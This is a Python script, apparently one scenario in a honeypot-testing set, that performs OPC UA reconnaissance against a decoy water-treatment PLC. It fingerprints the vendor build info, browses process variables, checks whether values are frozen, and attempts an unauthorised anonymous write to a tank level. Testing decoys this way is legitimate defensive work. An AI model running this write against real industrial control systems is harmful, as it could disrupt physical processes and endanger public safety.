"""
Scenario 6 -- OPC UA reconnaissance.

The same game as recon.py + read_registers.py + write_register.py, but against
the OPC UA decoy instead of a Modbus one. We ask the server who it is, browse its
variables, read them twice a few seconds apart to see if they MOVE, and then try
an unauthorised write (the decoy takes anonymous clients, just like Modbus asks
for no password).

  python recon_opcua.py <host> <port>
"""

import sys
import asyncio
import logging

from asyncua import Client, ua

logging.getLogger("asyncua").setLevel(logging.CRITICAL)   # keep its chatter out of the output

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = sys.argv[2] if len(sys.argv) > 2 else "4840"
url = f"opc.tcp://{host}:{port}/plc/"


async def main():
    print(f"[opcua] connecting to {url}")
    async with Client(url=url) as client:
        # who are you? a real PLC fills in its build info
        build_node = await client.nodes.server.get_child(["0:ServerStatus", "0:BuildInfo"])
        build = await build_node.read_value()
        print(f"        vendor:   {build.ManufacturerName}")
        print(f"        product:  {build.ProductName}")
        print(f"        firmware: {build.SoftwareVersion}  (order no {build.BuildNumber})")

        # browse down to the process variables
        process = None
        for node in await client.nodes.objects.get_children():
            bn = await node.read_browse_name()
            name = bn.Name
            if bn.NamespaceIndex == 0:      # skip the standard OPC UA furniture
                continue
            print(f"        found object: {name}")
            for child in await node.get_children():
                if (await child.read_browse_name()).Name == "WaterTreatment":
                    process = child
        if process is None:
            print("        no process variables found")
            return
        variables = await process.get_children()
        names = [(await v.read_browse_name()).Name for v in variables]
        print(f"        variables: {', '.join(names)}")

        # read them twice, a few seconds apart: frozen values give a honeypot away
        first = [await v.read_value() for v in variables]
        print(f"        read 1: {dict(zip(names, first))}")
        await asyncio.sleep(4)
        second = [await v.read_value() for v in variables]
        print(f"        read 2: {dict(zip(names, second))}")
        moved = [n for n, a, b in zip(names, first, second) if a != b]
        print(f"        moved:  {moved if moved else 'nothing -- frozen, looks fake'}")

        # unauthorised write, the interesting bit for an attacker
        pick = "level_%" if "level_%" in names else names[0]
        target = variables[names.index(pick)]
        try:
            await target.write_value(ua.Variant(999.0, ua.VariantType.Double))
            print(f"        write {pick} = 999.0, accepted: True")
        except ua.UaStatusCodeError as e:
            print(f"        write {pick} = 999.0, refused:", e)
        await asyncio.sleep(2)
        print(f"        two seconds later {pick} reads {await target.read_value()} "
              "-- the process carries on over the write")


asyncio.run(main())
